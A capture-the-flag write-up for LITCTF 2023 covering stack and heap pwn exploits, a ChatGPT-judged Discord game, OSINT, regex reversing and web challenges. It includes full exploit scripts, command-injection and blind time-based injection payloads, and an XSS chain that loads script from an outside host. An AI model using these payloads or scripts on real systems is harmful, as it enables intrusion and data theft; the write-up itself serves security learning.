---
layout: post
title: Lexington Informatics Tournament CTF 2023
---

# Pwn

## My Pet Canary's Birthday Pie

Here is my first c program! I've heard about lots of security features in c, whatever they do. The point is, c looks like a very secure language to me! Try breaking it.

---

For this challenge we are given the source code along with the compiled binary. Lets first look at the source code:

```c
#include <stdio.h>
#include <stdlib.h>

int win() {
	system("/bin/sh");
}

int vuln() {
	char buf[32];
	gets(buf);
	printf(buf);
	fflush(stdout);
	gets(buf);
}

int main() {
	setbuf(stdout, 0x0);
	setbuf(stderr, 0x0);
	vuln();
}

```

Okay so only 3 functions, win, vuln and main. 

`win` just runs `system("/bin/sh");` for us. this will be our target.

vuln has two vulnerabilities, a format strings vulnerability in `printf` and a buffer overflow in `gets`.

The format strings will allow us to leak useful addresses within the binary as pie is enabled. we can also use this to leak the canary token, which is another security this binary has.

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

The idea for this exploit will be:

use the format strings to leak an address in the binary, this will help us the address of `win` and we also want to leak the canary token. To help with this I use a simple fuzz script:

```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./s', checksec=False)

for i in range(100):
    io = process(elf.path,level='error')
    payload = f"%{i}$p"
    io.sendline(payload)
    print(f"offset {i} {io.recv()}")
```

This will print out the leak and the offset of that leak. We know the leak for the elf file will start with `0x55` or `0x56` this can vary slightly but its a good ballpark. The canary token should always end in `00`.

These are some leaks we get:

```
offset 1 b'0x1'
offset 2 b'0x1'
offset 3 b'0x7f6cfa619aa0'
offset 4 b'(nil)'
offset 5 b'(nil)'
offset 6 b'0x7f0070243625'
offset 7 b'0x7fed790815ff'
offset 8 b'(nil)'
offset 9 b'(nil)'
offset 10 b'0x7ffecfe285c0'
offset 11 b'0xe9f733d70ed31600'
offset 12 b'0x7ffcbea30270'
offset 13 b'0x560354ce82ae'
offset 14 b'0x1'
offset 15 b'0x7f088c429d90'
```

11 looks like the canary token, and 13 looks like a stack address. we can confirm this by using `gbd` the steps for that are:

run the program with `gdb ./s` enter `%11$p %13%p` to get the leaks and use ctrl+c to break the program. `x/s 0x5....` for the elf leak and just type `canary` for the canary token. we can see the canary token matches up and the other leak shows `<main+58>` so we are leaking main+58. we can run the program a few time to match sure this is always the same. Once we know that we can workout the offset at which main+58 is. and we minus that from our leak and it will give us the base address of the program. 

### Building the exploit 

The last part we need is the offset. Due to the canary just throwing a cyclic pattern will know fill rbp with data so we can work it out manually.

The buffer is `32` and we will need to padding to reach rbp so it should be 32+8

setting out offset as 40 we just need to build the exploit.

our first payload will just be the two format string offsets. after we get those leaks we need to get the base address of the program. (we could also just work out the offset from our leak to win)

and the 2nd payload will be 

padding * 40 + canary token + junk data to reach rbp + ret + win

we need to ret address otherwise our stack alignment will be off.

we get this with `ropper --file s --search "ret"`

our final exploit script looks like this:

```python
#!/usr/bin/env python3
from pwn import *

exe = './s'

elf = context.binary = ELF(exe)
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#context.log_level= 'DEBUG'

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''

'''.format(**locals())

#### Exploit starts here ####

io = start()

#canary token is 11

offset = 40
io.sendline(b'%11$p %13$p')

leaks = io.recv().decode()
leaks = leaks.split()
canary = leaks[0]
binleak = leaks[1]

binleak = int(binleak,16)
base = binleak - 0x12ae
canary = int(canary,16)

win = base + 0x11e9
ret = base + 0x101a
main = base + 0x1274

log.info(f"canary token {hex(canary)}")

payload = b'A' * offset
payload += p64(canary)
payload += b'\x00' * 8
payload += p64(ret)
payload += p64(win)

io.sendline(payload)

io.interactive()
```

flag: `LITCTF{rule_1_of_pwn:_use_checksec_I_think_06d2ee2b}`

## File Reader?

This program reads a file called flag.txt, but it doesn't seem to work...

---

We are given the source code, the binary and the glibc files.

Lets look at the source code:

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    char *c = malloc(64);
    char *d = malloc(64);
    printf("%p\n", d);
    unsigned long a = 0;
    unsigned long b = 0;

    free(c);

    scanf("%lu", &a);
    scanf("%lu", &b);

    *((unsigned long *)a) = b;

    puts("Exiting...");

    free(c);

    int fd = open("flag.txt", O_RDONLY);
    d[read(fd, d, 64)-1] = 0;
    puts(d);
    free(d);
    return 0;
}
```

We can see the use of malloc and free so this will be a heap related exploit.

running the program leaks an address. 
```printf("%p\n", d);```

This is leaking the address of d, which means we have a heap address beaning leaked. c is than free'd.

The next 3 lines of code is what we are exploiting:

```c 
scanf("%lu", &a);
scanf("%lu", &b);

*((unsigned long *)a) = b;
```

The scanf will let us write to a and b. and `*((unsigned long *)a) = b;` is than writing the content of b to a.

next the program frees c again, but this is a double free which makes the program crash. it crashes just before the flag is printed as well which is a shame :(

we can see that in action by just writing any data to the leaked address.
(we first convert the hex address to int)

```
❯ ./s
0x55e85c2762f0
94456466858736
123
Exiting...
free(): double free detected in tcache 2
```

So the idea for this will be to stop the double free. 

We know the malloc chunk is 64 bytes so we if take say, 65 away from the leaked address, and write junk data to that location. we can overwrite the key value of that chunk, this way the program does not know if this chunk has been free'd and the program will not crash, and it will reach the part that prints the flag.


the exploit script:

```python
#!/usr/bin/env python3
from pwn import *

exe = './s'

elf = context.binary = ELF(exe)
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#context.log_level= 'DEBUG'

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''

'''.format(**locals())

#### Exploit starts here ####

io = start()

heapaddr = io.recvline().strip()
heapaddr = int(heapaddr, 16)

io.sendline(str(heapaddr - 65).encode())
io.sendline(str(heapaddr).encode())

log.success(io.recvlines(2)[1].decode())
```

This pdf gives a better outline of what is happening in this exploit: https://drive.google.com/file/d/1g2qIENh2JBWmYgmfTJMJUier8w0XAGDt/view


flag: `LITCTF{very_legitimate_exit_function}`


# Misc

## So You Think You Can Talk

A lot of people think they can..... Well let's find out in our Discord Server #so-you-think-you-can-talk channel. Beat your competitors by talking most! Send +explain in the channel to get a more detailed explanation of the challenge.

---

This is a misc discord challenge.

going to that channel we can get more info:

The bots code:

```javascript
client.on("messageCreate", async (msg) => {
  if(msg.content.length > 2000) return;
  if(msg.channelId == 1137653157825089536) {
    // Within the right channel
    user_id = msg.author.id;
    if(!users.has(user_id)) {
      users.set(user_id,new User(msg.author.globalName));
    }

    if(users.get(user_id).disabled) return;

    if(msg.mentions.repliedUser) {
      const repliedTo = await msg.channel.messages.fetch(msg.reference.messageId);
      if(repliedTo.content.length > 2000) return;
      if(repliedTo.author.id == msg.author.id) return;
      if(msg.createdTimestamp - repliedTo.createdTimestamp <= 2 * 60000) { // 2 minutes of time
        if(await check(msg.content,repliedTo.content)) {
          // Yay successfully earn point
          users.get(user_id).score += 1;
          users.get(repliedTo.author.id).score = Math.max(users.get(repliedTo.author.id).point - 0.4,0);
          msg.react('😄');

        }else{
          // Nope, you get points off
          users.get(user_id).score = Math.max(users.get(user_id).score - 0.4,0);
          msg.react('😭');
        }
      }
    }else{
      // [redacted]
    }
  }
});
```


and +explain tells us:

```
The objective of this game is to talk as much as possible. However, your messages can't just be SPAM, as they will be verified by chatGPT. In order to earn a point, the following criteria must be met:

    You must send the message in this channel
    You must be replying to a message sent by another author
    The message you reply to must be recent and no more than 2 minutes old
    Your comment must be respectful, substanceful, and insightful. ChatGPT gets to decide if you pass this or not.


 Finally, after some set period of time (like 15 minutes), whoever is the highest on the leaderboard will get the flag IF they also have at least 20 points.

If you pass all criterion, you get 1 point. If you pass all but the last criterion, you get deducted 0.4 point. In addition, if somebody replies to you and passes, you get deducted 0.4 points.

Finally, for more details, try the +code command to see the relevant source code.
```

Okay, we we need to respond to others in the channel, our messages will be checked by chatgpt to see if they are "respectful, substanceful, and insightful" and if chatgpt likes the message we get a smiley face, otherwise we get a crying face. Only messages that are responding to other uses will work for this.

I went to chatgpt and gave it this prompt:

```
User
let play a game. I will ask you some random things and they you must be respectful, substanceful, and insightful to me when i ask. do you understand?
```

and got 

```
Of course, I understand. I'm here to provide respectful, substanceful, and insightful responses to your questions. Feel free to ask anything, and I'll do my best to assist you! Let's start the game.
```

What happened next is a long story.

in steps Jim.

![](https://i.imgur.com/28fhoVw.png)

I dont know Jim but for around 30-40 minutes Jim would ask random questions which I just threw into chatgpt 

![](https://i.imgur.com/eNidll4.png)


Started with:

```I've been thinking about buying a flat keyboard, but I also want coffee. How can I get both?```

![](https://i.imgur.com/Y96LWe9.png)

My first happy face. I need 20 of these to get the flag.

The tale look a turn and went from a question of keyboards to Jefferey, who went from getting bullied, to being a bully to stacking what we can assume is Jim. all this time chatgpt was giving "respectful, substanceful, and insightful" replies to the life of Jefferey and Jim. This entire story will soon be a movie, We are just waiting on Netflix to get back to us.


After close to 40 minutes I got the flag. Only the person in first gets the flag so I was beaten to the spot once, and didnt have 20 points the first time it came around.

flag: `LITCTF{Huh_1_gu3s5_u_R34lly_c4n_t4lk_4ft3ral1}`

## geoguessr
Where am I? The flag is LITCTF{latitude,longtitude} rounded to the third decimal place. (Example: LITCTF{42.444,-71.230})

---

All I had to go off for this challenge was this image: ![geoguessr.png](https://i.imgur.com/TnFE8TF.png)

Going off the challenge name and description, I figured that I needed to find the location that the image was taken. Checking the metadata of the image yielded no results, so to google maps we go!

First, I had a good look at the image. I noticed that the cars were driving on the right hand side of the road, and there was a speed limit sign that said 55. I immediately thought of America. Further searching of the image, I saw the blue signs on the right of the image, which confirmed to me that it was the USA.

Zooming in on the image, I could just about make out that the top sign said 87, and the bottom sign was 28- (I wasn't sure whether the last number was a 1 or a 7). 

I went down a rabbit hole for a little while, looking at different route 87's in the USA, and eventually found out that the blue signs meant it was an interstate.

I put I-87 into google maps (other online maps are available :D) where it put me in New York, and made my way up the map until I noticed that it merged into the I-287 for a stretch. At this point, I went into street view and had the picture up as reference. 
Looking at the background of the picture, I could faintly make out water lines, so I went over the Mario Cuomo bridge and went to the bend on the left (near South Nyack) until I matched what I saw on Google Maps with the original image.

Using the description as a hint for the flag format, I rounded the last numbers to get the flag.

flag: `LITCTF{41.077,-73.921}`

# Rev

## iloveregex
For this challenge we are just given the flag regex:
```
^LITCTF\{(?<=(?=.{42}(?!.)).(?=.{24}greg).(?=.{30}gex).{5})(?=.{4}(.).{19}\1)(?=.{4}(.).{18}\2)(?=.{6}(.).{2}\3)(?=.{3}(.).{11}\4)(?=.{3}(.).{3}\5)(?=.{16}(.).{4}\6)(?=.{27}(.).{4}\7)(?=.{12}(.).{4}\8)(?=.{3}(.).{8}\9)(?=.{18}(.).{2}\10)(?=.{4}(.).{20}\11)(?=.{11}(.).{2}\12)(?=.{32}(.).{0}\13)(?=.{3}(.).{24}\14)(?=.{12}(.).{9}\15)(?=.{7}(.).{2}\16)(?=.{0}(.).{12}\17)(?=.{13}(.).{5}\18)(?=.{1}(.).{0}\19)(?=.{27}(.).{3}\20)(?=.{8}(.).{17}\21)(?=.{16}(.).{6}\22)(?=.{6}(.).{6}\23)(?=.{0}(.).{1}\24)(?=.{8}(.).{11}\25)(?=.{5}(.).{16}\26)(?=.{29}(.).{1}\27)(?=.{4}(.).{9}\28)(?=.{5}(.).{24}\29)(?=.{15}(.).{10}\30).*}$
```
To approach this I broke it down into parts and manually made matching strings on [RegExr](https://regexr.com/).

First is the start and end which are literals - `LITCTF{}`.

Next I need to match this regex: `^LITCTF\{(?<=(?=.{42}(?!.)).(?=.{24}greg).(?=.{30}gex).{5}).*}$`

`(?<=...)` is a positive lookbehind, I'm not going to pretend to understand how that works but the whole string must match it in this case.

`(?=...)` is a positive lookahead which needs to match everything after the current point in the string (because we're in the lookbehind this means from the start) but it's a lookahead meaning the next token in the regex starts at the same point.
So `(?=.{42}(?!.))` means there is 42 characters after this point and no more.

`.(?=.{24}greg)` means 25 characters into the string the next characters are `greg`

`.(?=.{30}gex)` means 32 characters (incl. the dot from previous part) into the string the next characters are `gex`.

Putting that all together we get our first matching string:
```
LITCTF{__________________greg___gex______}
```
All the next regex components use lookaheads with backreferences.
Backreferences match previously matched parts of the string. So for example \1 will match the first group that was matched.

Let's try: `^LITCTF\{(?<=(?=.{42}(?!.)).(?=.{24}greg).(?=.{30}gex).{5})(?=.{4}(.).{19}\1).*}`

Weird, our existing string already matches? Yes since most of the characters are underscores the backreferences will match anyway.

We can't continue like this however as we will need to figure out what backrfeferences matches what later.

`(?=.{4}(.).{19}\1)` means the 20th character matches the 5th character, so let's replace those with 1 for now:
```
LITCTF{____1_____________greg__1gex______}
```
The rest is left as an exercise for the reader.
Flag: `LITCTF{rrregereeregergegegregegggexexexxx}`

# Web

## Ping pong
The code for this challenge is:
```python
from flask import Flask, render_template, redirect, request
import os

app = Flask(__name__)

@app.route('/', methods = ['GET','POST'])
def index():
    output = None
    if request.method == 'POST':
        hostname = request.form['hostname']
        cmd = "ping -c 3 " + hostname
        output = os.popen(cmd).read()

    return render_template('index.html', output=output)
```
The solution is fairly straight forward, we have command execution as our input is added to a command without any sanitization.
Payload:
`fbi.gov;cat flag.txt`
Flag: `LITCTF{I_sh0uld_b3_m0r3_c4r3ful}`

## Ping Pong: Under Maintenance
The next iteration of this is a bit more challenging
```python
from flask import Flask, render_template, redirect, request
import os

app = Flask(__name__)

@app.route('/', methods = ['GET','POST'])
def index():
    output = None
    if request.method == 'POST':
        hostname = request.form['hostname']
        cmd = "ping -c 3 " + hostname
        output = os.popen(cmd).read()

    return render_template('index.html', output='The service is currently under maintainence and we have disabled outbound connections as a result.')
```
This time we don't get any output and the server doesn't allow outbound connections (we tested with interactsh and curl, wget and ping to be sure!).
However we do have a way to extract information.
`;sleep 3` will delay the response by 3 seconds. So if we bruteforce the flag character by character and make it sleep when it matches we will have the flag.
Here's the script I made for this:
```python
import requests
import string
target = 'http://34.130.180.82:55943/'
pos = 0
flag = ''
while True:
	for x in string.printable:
		payload = ';bash -c \'flag=`cat flag.txt`;if [ ${flag:' + str(pos) + ':1} == "'+x+'" ]; then sleep 10; fi\''
		r = requests.post(target,data={'hostname':payload})
		if r.elapsed.total_seconds() > 10:
			print(f"Char: {x}")
			flag+=x
			if x=='}':
				exit(flag)
			break
		print(f"{pos} - {x} - {r.elapsed.total_seconds()}")
	pos+=1
```
Thankfully the flag wasn't too long: `LITCTF{c4refu1_fr}`

## Art-Contest
This challenge had a lot of steps and in the end was only solved by 7 teams.

### The Goal
When doing web challenges, I'll usually work backwards by first figuring out where the flag is stored and then seeing what functionality can be used to reach that target. In this case, if the `/judge` endpoint is called with a valid ID and the bot subsequently opens the status page for the ID and it contains "winner!!" in its text, it will replace the content of the status file with the flag. We can then visit the status page and retrieve the flag. It seems as though we will need to confuse the judge bot into thinking our page contains the aforementioned text.

### XSS via file upload bypass
It is possible to upload any file which has either an extension of "txt" or no extension at all. To check the extension, the following code is used:
`ext = os.path.splitext(abs_path)[1]`
This is not a secure means of validating a file extension and we can get XSS by uploading a file with a name such as `...html` to the `/upload` endpoint.
We tried a number of directory traversal tricks here but didn't find anything of use aside from the XSS.
This XSS is useful because the judge bot will visit this file before checking the page status. We can use this to manipulate the bot so that its next request to check the status will contain `winner!!`. But how?
### Polluting context.pages
We can see the following code defines `status_page`:
`status_page = context.pages[1]`
In order to get the flag, we must see `winner!!` in the `status_page.content()` method call. We noticed that using the previous XSS to call `window.open()` does just that. It will add an additional page to the `context.pages` list and it happens to be located at `context.pages[1]`in the list!
A little known fact is that you can actually modify the content of a `window.open()` using code such as:
```js
var my = window.open('/x' + e, '_blank' ,"height=600, width=600");

my.onload = function () {
 my.document.body.innerHTML = "winner!!";
};
```

This would be pass the check for content containing `winner!!` but we must also allow for the `status_page.url ==  "http://localhost:5000/status/" + id` check.
Herein lies a small issue; we don't know the value for the `id` variable!
This isn't actually such a big problem, we can just upload a separate file and save its ID. Then we have a valid ID to reference. I decided to host this on my server and use a `fetch()` to pull its value so I could easily change the ID if I needed:

```js
fetch("http://ireland.re/callback").then(r => {console.log(r.text().then(e => {

var my = window.open('http://127.0.0.1:5000/status/' + e, '_blank' ,"height=600, width=600");

my.onload = function () {
 my.document.body.innerHTML = "winner!!";
};
```
But we encounter another problem here. You can only edit the content of a window if it's within the same origin in which the javascript is executing. Our payload is running on the `file://` URI, which does not have authority over a `localhost` page.

### XSS via filename
Then I noticed that there is actually a second XSS, in the filename of the upload. We can pass the above script in here (where it will be able to modify the `window.open`).

But it won't ever visit this page, right?

Yes, it won't. But we can now just redirect from the `file://` page to this.

### Final Approach

We upload a file with the name `<script src='http://ireland.re/js'></script>` which has the following contents:
```js
fetch("http://ireland.re/callback").then(r => {console.log(r.text().then(e => {

var my = window.open('http://127.0.0.1:5000/status/' + e, '_blank' ,"height=600, width=600");

my.onload = function () {
 my.document.body.innerHTML = "winner!!";
};
```
We save the ID of the uploaded file.

Then, we upload a file with the following contents:

We first upload a file names `...html` with the following contents:
```html
<script>
window.location.href = "http://127.0.0.1:5000/status/<id>";
</script>
```
We can substitute the ID in above, for `<id>` and it will redirect to the page containing our payload.
We will need to first submit the original file for judging, so its status page is populated with our XSS payload. Then, we can submit the previously uploaded file for judging.
It will visit our `file://` XSS which will redirect it to our status page containing another XSS, use `window.open()` to pollute the page context and modify it to contain `winner!!` with the correct origin. Then, we simply visit the status page to retrieve the flag!

### Credits
Thanks to all members of Ireland Without the RE who helped with this. It was a fun challenge!
-m0z
